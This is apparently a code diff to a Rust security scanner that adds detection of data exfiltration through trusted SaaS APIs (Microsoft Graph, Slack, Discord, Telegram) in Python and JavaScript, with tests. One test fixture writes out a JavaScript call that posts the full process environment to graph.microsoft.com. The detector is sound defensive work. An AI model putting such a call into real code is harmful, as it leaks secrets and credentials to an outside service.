@@ -649,6 +649,7 @@ pub fn find_slop(language: &str, parsed: &ParsedUnit<'_>) -> Vec<SlopFinding> {
             // CISA KEV gates — AST-based (Python grammar); share parse tree via ParsedUnit
             f.extend(find_python_sqli_slop(eng, parsed));
             f.extend(find_python_ssrf_slop(eng, parsed));
+            f.extend(find_python_lotl_api_c2_slop(eng, parsed));
             f.extend(find_python_path_traversal_slop(eng, parsed));
             f.extend(find_jwt_validation_bypass(source));
             f.extend(find_saml_xsw_and_xxe(source));
@@ -664,6 +665,7 @@ pub fn find_slop(language: &str, parsed: &ParsedUnit<'_>) -> Vec<SlopFinding> {
             // CISA KEV gates — AST-based (JS grammar); share parse tree via ParsedUnit
             f.extend(find_js_sqli_slop(eng, parsed));
             f.extend(find_js_ssrf_slop(eng, parsed));
+            f.extend(find_js_lotl_api_c2_slop(eng, parsed));
             f.extend(find_js_path_traversal_slop(eng, parsed));
             // Phase 1 R&D: prototype pollution Layer A (AhoCorasick)
             f.extend(find_prototype_pollution_slop(source));
@@ -3075,6 +3077,39 @@ const SSRF_HTTP_CALLEES_JS: &[&str] = &[
     "request",
 ];
 
+/// Trusted SaaS API domains abused by living-off-the-land C2 implants.
+const TRUSTED_API_DOMAINS: &[&str] = &[
+    "graph.microsoft.com",
+    "slack.com/api",
+    "discord.com/api/webhooks",
+    "api.telegram.org",
+];
+
+/// Outbound JavaScript/TypeScript HTTP sinks eligible for LotL API C2 tracing.
+const LOTL_HTTP_CALLEES_JS: &[&str] = &[
+    "fetch",
+    "axios.get",
+    "axios.post",
+    "axios.put",
+    "axios.delete",
+    "axios.patch",
+    "axios.request",
+    "http.get",
+    "http.request",
+    "https.get",
+    "https.request",
+];
+
+/// Outbound Python HTTP sinks eligible for LotL API C2 tracing.
+const LOTL_HTTP_CALLEES_PY: &[&str] = &[
+    "requests.post",
+    "requests.put",
+    "requests.request",
+    "httpx.post",
+    "httpx.put",
+    "urllib.request.urlopen",
+];
+
 /// Node.js filesystem callees targeted by the path-traversal AST gate.
 const FS_OPEN_CALLEES_JS: &[&str] = &[
     "fs.readFile",
@@ -3088,6 +3123,23 @@ const FS_OPEN_CALLEES_JS: &[&str] = &[
     "fs.open",
     "fs.openSync",
 ];
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum LotlPayloadSource {
+    EnvDump,
+    CommandResult,
+    HighEntropyToken,
+}
+
+impl LotlPayloadSource {
+    fn description(self) -> &'static str {
+        match self {
+            Self::EnvDump => "environment variable dump",
+            Self::CommandResult => "command execution result",
+            Self::HighEntropyToken => "high-entropy token payload",
+        }
+    }
+}
 
 // ---------------------------------------------------------------------------
 // CISA KEV — Shared AST helpers
@@ -3255,6 +3307,220 @@ fn find_ssrf_calls_py(node: Node<'_>, source: &[u8], findings: &mut Vec<SlopFind
     for child in node.children(&mut cursor) {
         find_ssrf_calls_py(child, source, findings);
     }
+}
+
+/// LotL API C2 detection for Python: flags trusted SaaS API calls whose
+/// payload provenance resolves to environment dumps, subprocess output, or
+/// high-entropy token blobs.
+fn find_python_lotl_api_c2_slop(eng: &QueryEngine, parsed: &ParsedUnit<'_>) -> Vec<SlopFinding> {
+    let source = parsed.source;
+    let has_trusted_domain = TRUSTED_API_DOMAINS
+        .iter()
+        .any(|domain| source.windows(domain.len()).any(|w| w == domain.as_bytes()));
+    let has_http = LOTL_HTTP_CALLEES_PY
+        .iter()
+        .any(|callee| source.windows(callee.len()).any(|w| w == callee.as_bytes()));
+    let has_sensitive_source = source
+        .windows("os.environ".len())
+        .any(|w| w == b"os.environ")
+        || source
+            .windows("subprocess".len())
+            .any(|w| w == b"subprocess")
+        || source
+            .windows("check_output".len())
+            .any(|w| w == b"check_output")
+        || source.windows("popen(".len()).any(|w| w == b"popen(");
+    if !has_trusted_domain || !has_http || !has_sensitive_source {
+        return Vec::new();
+    }
+
+    let tree = match parsed.ensure_tree(eng.python_lang.clone(), "py") {
+        Ok(Some(tree)) => tree,
+        Ok(None) => return Vec::new(),
+        Err(finding) => return vec![finding],
+    };
+
+    let root = tree.root_node();
+    let mut trusted_bindings = HashMap::new();
+    collect_python_trusted_api_bindings(root, source, &mut trusted_bindings);
+    let mut risky_bindings = HashMap::new();
+    collect_python_lotl_risky_bindings(root, source, &mut risky_bindings);
+
+    let mut findings = Vec::new();
+    find_python_lotl_api_c2_calls(
+        root,
+        source,
+        &trusted_bindings,
+        &risky_bindings,
+        &mut findings,
+    );
+    findings
+}
+
+fn collect_python_trusted_api_bindings(
+    node: Node<'_>,
+    source: &[u8],
+    trusted_bindings: &mut HashMap<String, String>,
+) {
+    if let Some((name, value)) = python_binding_parts(node, source) {
+        if let Some(domain) = python_expression_trusted_api_domain(value, source, trusted_bindings)
+        {
+            trusted_bindings.insert(name, domain);
+        }
+    }
+
+    let mut cursor = node.walk();
+    for child in node.children(&mut cursor) {
+        collect_python_trusted_api_bindings(child, source, trusted_bindings);
+    }
+}
+
+fn collect_python_lotl_risky_bindings(
+    node: Node<'_>,
+    source: &[u8],
+    risky_bindings: &mut HashMap<String, LotlPayloadSource>,
+) {
+    if let Some((name, value)) = python_binding_parts(node, source) {
+        if let Some(kind) = python_expression_lotl_source(value, source, risky_bindings) {
+            risky_bindings.insert(name, kind);
+        }
+    }
+
+    let mut cursor = node.walk();
+    for child in node.children(&mut cursor) {
+        collect_python_lotl_risky_bindings(child, source, risky_bindings);
+    }
+}
+
+fn find_python_lotl_api_c2_calls(
+    node: Node<'_>,
+    source: &[u8],
+    trusted_bindings: &HashMap<String, String>,
+    risky_bindings: &HashMap<String, LotlPayloadSource>,
+    findings: &mut Vec<SlopFinding>,
+) {
+    if node.kind() == "call" {
+        if let (Some(function), Some(arguments)) = (
+            node.child_by_field_name("function"),
+            node.child_by_field_name("arguments"),
+        ) {
+            let callee = function.utf8_text(source).unwrap_or("");
+            if LOTL_HTTP_CALLEES_PY.contains(&callee) {
+                let destination = arguments
+                    .named_children(&mut arguments.walk())
+                    .find_map(|arg| {
+                        python_expression_trusted_api_domain(arg, source, trusted_bindings)
+                    });
+                let payload_source = arguments
+                    .named_children(&mut arguments.walk())
+                    .find_map(|arg| python_expression_lotl_source(arg, source, risky_bindings));
+                if let (Some(domain), Some(payload_source)) = (destination, payload_source) {
+                    findings.push(SlopFinding {
+                        start_byte: node.start_byte(),
+                        end_byte: node.end_byte(),
+                        description: format!(
+                            "security:lotl_api_c2_exfiltration — `{callee}()` sends a {} to trusted SaaS endpoint `{domain}`; this is characteristic living-off-the-land API C2 / exfiltration designed to bypass domain blocklists",
+                            payload_source.description()
+                        ),
+                        domain: DOMAIN_FIRST_PARTY,
+                        severity: Severity::KevCritical,
+                    });
+                }
+            }
+        }
+    }
+
+    let mut cursor = node.walk();
+    for child in node.children(&mut cursor) {
+        find_python_lotl_api_c2_calls(child, source, trusted_bindings, risky_bindings, findings);
+    }
+}
+
+fn python_binding_parts<'tree>(node: Node<'tree>, source: &[u8]) -> Option<(String, Node<'tree>)> {
+    if node.kind() != "assignment" {
+        return None;
+    }
+    let left = node.child_by_field_name("left")?;
+    let right = node.child_by_field_name("right")?;
+    if left.kind() != "identifier" {
+        return None;
+    }
+    Some((left.utf8_text(source).ok()?.to_owned(), right))
+}
+
+fn python_expression_trusted_api_domain(
+    node: Node<'_>,
+    source: &[u8],
+    trusted_bindings: &HashMap<String, String>,
+) -> Option<String> {
+    if node.kind() == "identifier" {
+        let name = node.utf8_text(source).ok()?;
+        if let Some(domain) = trusted_bindings.get(name) {
+            return Some(domain.clone());
+        }
+    }
+
+    if let Ok(text) = node.utf8_text(source) {
+        if let Some(domain) = trusted_api_domain_in_text(text) {
+            return Some(domain.to_owned());
+        }
+    }
+
+    let mut cursor = node.walk();
+    for child in node.children(&mut cursor) {
+        if let Some(domain) = python_expression_trusted_api_domain(child, source, trusted_bindings)
+        {
+            return Some(domain);
+        }
+    }
+    None
+}
+
+fn python_expression_lotl_source(
+    node: Node<'_>,
+    source: &[u8],
+    risky_bindings: &HashMap<String, LotlPayloadSource>,
+) -> Option<LotlPayloadSource> {
+    if node.kind() == "identifier" {
+        let name = node.utf8_text(source).ok()?;
+        if let Some(kind) = risky_bindings.get(name).copied() {
+            return Some(kind);
+        }
+    }
+
+    if node
+        .utf8_text(source)
+        .ok()
+        .is_some_and(|text| text.contains("os.environ"))
+    {
+        return Some(LotlPayloadSource::EnvDump);
+    }
+
+    if matches!(node.kind(), "string" | "string_literal") {
+        if let Ok(text) = node.utf8_text(source) {
+            let trimmed = text.trim_matches(['"', '\'']);
+            if trimmed.len() > 32 && shannon_entropy(trimmed.as_bytes()) > 4.5 {
+                return Some(LotlPayloadSource::HighEntropyToken);
+            }
+        }
+    }
+
+    if node.kind() == "call" {
+        if let Some(function) = node.child_by_field_name("function") {
+            let callee = function.utf8_text(source).unwrap_or("");
+            if matches!(callee, "subprocess.check_output" | "os.popen") {
+                return Some(LotlPayloadSource::CommandResult);
+            }
+        }
+    }
+
+    let mut cursor = node.walk();
+    for child in node.children(&mut cursor) {
+        if let Some(kind) = python_expression_lotl_source(child, source, risky_bindings) {
+            return Some(kind);
+        }
+    }
+    None
 }
 
 /// Path traversal detection for Python: flags `open()` calls whose first
@@ -4054,6 +4320,279 @@ fn find_ssrf_calls_js(node: Node<'_>, source: &[u8], findings: &mut Vec<SlopFind
     for child in node.children(&mut cursor) {
         find_ssrf_calls_js(child, source, findings);
     }
+}
+
+/// LotL API C2 detection for JS/TS: flags trusted SaaS API calls whose payload
+/// provenance resolves to `process.env`, child-process execution, or a
+/// high-entropy token blob.
+fn find_js_lotl_api_c2_slop(eng: &QueryEngine, parsed: &ParsedUnit<'_>) -> Vec<SlopFinding> {
+    let source = parsed.source;
+    let has_trusted_domain = TRUSTED_API_DOMAINS
+        .iter()
+        .any(|domain| source.windows(domain.len()).any(|w| w == domain.as_bytes()));
+    let has_http = LOTL_HTTP_CALLEES_JS
+        .iter()
+        .any(|callee| source.windows(callee.len()).any(|w| w == callee.as_bytes()));
+    let has_sensitive_source = source
+        .windows("process.env".len())
+        .any(|w| w == b"process.env")
+        || source
+            .windows("child_process".len())
+            .any(|w| w == b"child_process")
+        || source.windows("execSync".len()).any(|w| w == b"execSync")
+        || source.windows("exec(".len()).any(|w| w == b"exec(");
+    if !has_trusted_domain || !has_http || !has_sensitive_source {
+        return Vec::new();
+    }
+
+    let tree = match parsed.ensure_tree(eng.js_lang.clone(), "js") {
+        Ok(Some(tree)) => tree,
+        Ok(None) => return Vec::new(),
+        Err(finding) => return vec![finding],
+    };
+
+    let root = tree.root_node();
+    let mut child_process_aliases = HashMap::new();
+    collect_js_child_process_aliases(root, source, &mut child_process_aliases);
+
+    let mut trusted_bindings = HashMap::new();
+    collect_js_trusted_api_bindings(root, source, &mut trusted_bindings);
+
+    let mut risky_bindings = HashMap::new();
+    collect_js_lotl_risky_bindings(root, source, &child_process_aliases, &mut risky_bindings);
+
+    let mut findings = Vec::new();
+    find_js_lotl_api_c2_calls(
+        root,
+        source,
+        &child_process_aliases,
+        &trusted_bindings,
+        &risky_bindings,
+        &mut findings,
+    );
+    findings
+}
+
+fn collect_js_trusted_api_bindings(
+    node: Node<'_>,
+    source: &[u8],
+    trusted_bindings: &mut HashMap<String, String>,
+) {
+    if let Some((name, value)) = js_binding_parts(node, source) {
+        if let Some(domain) = js_expression_trusted_api_domain(value, source, trusted_bindings) {
+            trusted_bindings.insert(name, domain);
+        }
+    }
+
+    let mut cursor = node.walk();
+    for child in node.children(&mut cursor) {
+        collect_js_trusted_api_bindings(child, source, trusted_bindings);
+    }
+}
+
+fn collect_js_lotl_risky_bindings(
+    node: Node<'_>,
+    source: &[u8],
+    child_process_aliases: &HashMap<String, bool>,
+    risky_bindings: &mut HashMap<String, LotlPayloadSource>,
+) {
+    if let Some((name, value)) = js_binding_parts(node, source) {
+        if let Some(kind) =
+            js_expression_lotl_source(value, source, child_process_aliases, risky_bindings)
+        {
+            risky_bindings.insert(name, kind);
+        }
+    }
+
+    let mut cursor = node.walk();
+    for child in node.children(&mut cursor) {
+        collect_js_lotl_risky_bindings(child, source, child_process_aliases, risky_bindings);
+    }
+}
+
+fn find_js_lotl_api_c2_calls(
+    node: Node<'_>,
+    source: &[u8],
+    child_process_aliases: &HashMap<String, bool>,
+    trusted_bindings: &HashMap<String, String>,
+    risky_bindings: &HashMap<String, LotlPayloadSource>,
+    findings: &mut Vec<SlopFinding>,
+) {
+    if node.kind() == "call_expression" {
+        if let (Some(function), Some(arguments)) = (
+            node.child_by_field_name("function"),
+            node.child_by_field_name("arguments"),
+        ) {
+            let callee = function.utf8_text(source).unwrap_or("");
+            if LOTL_HTTP_CALLEES_JS.contains(&callee) {
+                let destination = arguments
+                    .named_children(&mut arguments.walk())
+                    .find_map(|arg| {
+                        js_expression_trusted_api_domain(arg, source, trusted_bindings)
+                    });
+                let payload_source =
+                    arguments
+                        .named_children(&mut arguments.walk())
+                        .find_map(|arg| {
+                            js_expression_lotl_source(
+                                arg,
+                                source,
+                                child_process_aliases,
+                                risky_bindings,
+                            )
+                        });
+                if let (Some(domain), Some(payload_source)) = (destination, payload_source) {
+                    findings.push(SlopFinding {
+                        start_byte: node.start_byte(),
+                        end_byte: node.end_byte(),
+                        description: format!(
+                            "security:lotl_api_c2_exfiltration — `{callee}()` sends a {} to trusted SaaS endpoint `{domain}`; this is characteristic living-off-the-land API C2 / exfiltration designed to bypass domain blocklists",
+                            payload_source.description()
+                        ),
+                        domain: DOMAIN_FIRST_PARTY,
+                        severity: Severity::KevCritical,
+                    });
+                }
+            }
+        }
+    }
+
+    let mut cursor = node.walk();
+    for child in node.children(&mut cursor) {
+        find_js_lotl_api_c2_calls(
+            child,
+            source,
+            child_process_aliases,
+            trusted_bindings,
+            risky_bindings,
+            findings,
+        );
+    }
+}
+
+fn js_binding_parts<'tree>(node: Node<'tree>, source: &[u8]) -> Option<(String, Node<'tree>)> {
+    match node.kind() {
+        "variable_declarator" => {
+            let name = node.child_by_field_name("name")?.utf8_text(source).ok()?;
+            let value = node.child_by_field_name("value")?;
+            Some((name.to_owned(), value))
+        }
+        "assignment_expression" => {
+            let left = node.child_by_field_name("left")?;
+            let right = node
+                .child_by_field_name("right")
+                .or_else(|| third_named_child(node))?;
+            if left.kind() == "identifier" {
+                Some((left.utf8_text(source).ok()?.to_owned(), right))
+            } else {
+                None
+            }
+        }
+        _ => None,
+    }
+}
+
+fn js_expression_trusted_api_domain(
+    node: Node<'_>,
+    source: &[u8],
+    trusted_bindings: &HashMap<String, String>,
+) -> Option<String> {
+    if node.kind() == "identifier" {
+        let name = node.utf8_text(source).ok()?;
+        if let Some(domain) = trusted_bindings.get(name) {
+            return Some(domain.clone());
+        }
+    }
+
+    if let Some(text) = js_stringish_text(node, source) {
+        if let Some(domain) = trusted_api_domain_in_text(&text) {
+            return Some(domain.to_owned());
+        }
+    }
+
+    let mut cursor = node.walk();
+    for child in node.children(&mut cursor) {
+        if let Some(domain) = js_expression_trusted_api_domain(child, source, trusted_bindings) {
+            return Some(domain);
+        }
+    }
+    None
+}
+
+fn js_expression_lotl_source(
+    node: Node<'_>,
+    source: &[u8],
+    child_process_aliases: &HashMap<String, bool>,
+    risky_bindings: &HashMap<String, LotlPayloadSource>,
+) -> Option<LotlPayloadSource> {
+    if node.kind() == "identifier" {
+        let name = node.utf8_text(source).ok()?;
+        if let Some(kind) = risky_bindings.get(name).copied() {
+            return Some(kind);
+        }
+    }
+
+    if js_node_contains_process_env(node, source) {
+        return Some(LotlPayloadSource::EnvDump);
+    }
+
+    if js_high_entropy_literal(node, source) {
+        return Some(LotlPayloadSource::HighEntropyToken);
+    }
+
+    if node.kind() == "call_expression" {
+        if let Some(function) = node.child_by_field_name("function") {
+            let mut obfuscated = false;
+            let mut child_process_context = false;
+            if js_expression_resolves_exec_sink(
+                function,
+                source,
+                child_process_aliases,
+                &mut obfuscated,
+                &mut child_process_context,
+            )
+            .is_some()
+                && child_process_context
+            {
+                return Some(LotlPayloadSource::CommandResult);
+            }
+        }
+    }
+
+    let mut cursor = node.walk();
+    for child in node.children(&mut cursor) {
+        if let Some(kind) =
+            js_expression_lotl_source(child, source, child_process_aliases, risky_bindings)
+        {
+            return Some(kind);
+        }
+    }
+    None
+}
+
+fn js_node_contains_process_env(node: Node<'_>, source: &[u8]) -> bool {
+    node.utf8_text(source)
+        .ok()
+        .is_some_and(|text| text.contains("process.env"))
+}
+
+fn js_high_entropy_literal(node: Node<'_>, source: &[u8]) -> bool {
+    if !matches!(
+        node.kind(),
+        "string" | "string_fragment" | "string_literal" | "template_string"
+    ) {
+        return false;
+    }
+    js_stringish_text(node, source)
+        .is_some_and(|text| text.len() > 32 && shannon_entropy(text.as_bytes()) > 4.5)
+}
+
+fn trusted_api_domain_in_text(text: &str) -> Option<&'static str> {
+    let lower = text.to_ascii_lowercase();
+    TRUSTED_API_DOMAINS
+        .iter()
+        .copied()
+        .find(|domain| lower.contains(domain))
 }
 
 /// Path traversal detection for JS/TS: flags [`FS_OPEN_CALLEES_JS`] calls
@@ -7427,6 +7966,41 @@ mod kev_tests {
                 .iter()
                 .all(|f| !f.description.contains("ssrf_dynamic_url")),
             "JS SSRF static fetch must not be flagged"
+        );
+    }
+
+    #[test]
+    fn test_js_lotl_api_c2_process_env_to_graph_detected() {
+        let src = br#"
+const api = "https://graph.microsoft.com/v1.0/me/messages";
+fetch(api, {
+  method: "POST",
+  body: JSON.stringify(process.env)
+});
+"#;
+        let findings = find_slop("js", src);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.description.contains("security:lotl_api_c2_exfiltration")),
+            "process.env sent to graph.microsoft.com must fire LotL API C2 interception"
+        );
+    }
+
+    #[test]
+    fn test_js_lotl_api_c2_static_payload_not_flagged() {
+        let src = br#"
+fetch("https://graph.microsoft.com/v1.0/me", {
+  method: "POST",
+  body: JSON.stringify({ hello: "world" })
+});
+"#;
+        let findings = find_slop("js", src);
+        assert!(
+            findings
+                .iter()
+                .all(|f| !f.description.contains("security:lotl_api_c2_exfiltration")),
+            "trusted API calls without a sensitive payload provenance must remain clean"
         );
     }
 
